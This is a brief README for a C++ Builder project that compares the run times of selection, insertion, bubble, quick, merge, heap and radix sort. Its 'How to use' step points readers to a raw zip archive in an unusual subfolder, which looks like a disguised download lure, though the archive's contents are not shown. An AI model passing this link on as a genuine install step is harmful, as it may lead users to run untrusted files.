# cpp_sorting_alg_compare
embarcadero c++ builder project: Performance Evaluation for Sorting Algorithms

How to use: Open and compile https://github.com/weiran0630/cpp_sorting_alg_compare/raw/refs/heads/master/vaire/compare-sorting-alg-cpp-v1.6.zip with embarcadero c++ builder

Usage: Generate n variables within a range and perform sorting, 
meanwhile return an execution time for each selected sorting method.

Implemented sorting algorithm: 
 (1). Selection sort
 (2). Insertion sort
 (3). Bubble sort
 (4). Quick sort (recursive versions)
 (5). Quick sort (non-recursive versions)
 (6). Merge sort (recursive versions)
 (7). Merge sort (non-recursive versions)
 (8). Heap sort
 (9). Radix sort
